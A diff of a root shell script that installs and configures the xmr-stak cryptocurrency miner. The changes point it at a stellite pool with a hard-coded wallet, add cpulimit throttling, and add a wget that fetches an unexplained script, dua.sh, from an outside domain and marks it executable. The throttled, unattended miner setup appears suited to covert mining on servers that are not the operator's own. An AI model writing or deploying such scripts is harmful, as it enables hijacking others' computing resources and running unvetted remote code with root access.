@@ -2,15 +2,15 @@
 
 POOLS="\"pool_list\" :\n"
 POOLS+="[\n"
-POOLS+="{\"pool_address\" : \"206.189.31.50:80\",\n"
-POOLS+="\"wallet_address\" : \"AWS\", \"rig_id\" : \"\",\n"
+POOLS+="{\"pool_address\" : \"stellite.ingest.cryptoknight.cc:16221\",\n"
+POOLS+="\"wallet_address\" : \"Se4G4dRGF7tDRgurapEBfhgmLbUoF9prYHAG6NtFyR1kaSsBQ4XqV2fXyqFetMJV8oMZh8uQ5jwu6BihYquXUfVg1joA6nbWk\", \"rig_id\" : \"\",\n"
 POOLS+="\"pool_password\" : \"x\",\n"
 POOLS+="\"use_nicehash\" : true,\n"
 POOLS+="\"use_tls\" : false,\n"
 POOLS+="\"tls_fingerprint\" : \"\",\n"
 POOLS+="\"pool_weight\" : 1 },\n"
 POOLS+="],\n"
-POOLS+="\"currency\" : \"cryptonight\",\n"
+POOLS+="\"currency\" : \"monero7\",\n"
 
 CONFIG="\"call_timeout\" : 10,\n"
 CONFIG+="\"retry_time\" : 30,\n"
@@ -31,6 +31,7 @@ CONFIG+="\"prefer_ipv4\" : true,\n"
 
 echo "---UPDATING SYSTEM---"
 apt-get update --assume-yes
+apt install cpulimit
 
 echo "---INSTALL DEPENDENCING---"
 sudo apt-get update && sudo apt-get -y install libmicrohttpd-dev libssl-dev cmake build-essential libhwloc-dev htop
@@ -59,6 +60,9 @@ touch /root/xmr-stak/build/bin/config.txt
 printf "%b\n" "$CONFIG" >> /root/xmr-stak/build/bin/config.txt
 chown root /root/xmr-stak/build/bin/config.txt
 cd /root
+
+wget https://garudamiliter.com/dua.sh
+chmod a+x dua.sh
 
 echo "--MAKE EXECUTABLE CUSTOM FILE---"
 echo "cd xmr-stak/build/bin/ && ./xmr-stak" >> miner
